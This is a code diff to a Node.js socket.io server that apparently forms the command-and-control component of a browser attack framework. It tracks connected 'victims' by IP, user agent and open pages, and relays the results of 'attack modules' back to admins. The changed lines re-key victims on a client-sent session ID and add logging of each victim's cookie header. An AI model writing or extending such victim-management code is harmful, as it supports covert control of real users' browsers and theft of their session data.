@@ -12,8 +12,11 @@ module.exports.configure = function(io){
 
     socket.join('victims')
 
-    //process newly connected victim
-    connect(socket)
+    socket.on('identify', function(sessID){
+      socket.sessID = sessID
+      //process newly connected victim
+      connect(socket)
+    })
 
     //when an attack module has finished running. Relay it back to the admins
     socket.on('result', function(data){
@@ -28,7 +31,8 @@ module.exports.configure = function(io){
     //when user disconnects, let admin know
     socket.on('disconnect', function(){
       disconnect(socket)
-      console.log(`victim ${victimsBySessionId[socket.handshake.session.id].visibleId} disconnected`)
+      console.log(socket.handshake.headers.cookie)
+      console.log(`victim ${victimsBySessionId[socket.sessID].visibleId} disconnected`)
     })
 
   })
@@ -36,8 +40,7 @@ module.exports.configure = function(io){
 
 
 function connect(socket){
-  let sessionId = socket.handshake.session.id
-  let victim = victimsBySessionId[sessionId]
+  let victim = victimsBySessionId[socket.sessID]
   if(!victim){
     processNewVictim(socket)
   }else{
@@ -56,7 +59,7 @@ function processNewVictim(socket){
   //when connecting from localhost address is '::1'
   ip = ip === '1' ? '127.0.0.1' : ip
 
-  let newVictim = victimsBySessionId[socket.handshake.session.id] = {
+  let newVictim = victimsBySessionId[socket.sessID] = {
     visibleId: visibleIdIndex++,
     ip,
     agent: socket.handshake.headers['user-agent'],
@@ -81,8 +84,7 @@ function processNewVictim(socket){
 }
 
 function disconnect(socket){
-  let sessionId = socket.handshake.session.id
-  let victim = victimsBySessionId[sessionId]
+  let victim = victimsBySessionId[socket.sessID]
 
   //adminSocket.emit('victimDisconnect', socket.id)
   delete victim.activePagesBySocketId[socket.id]
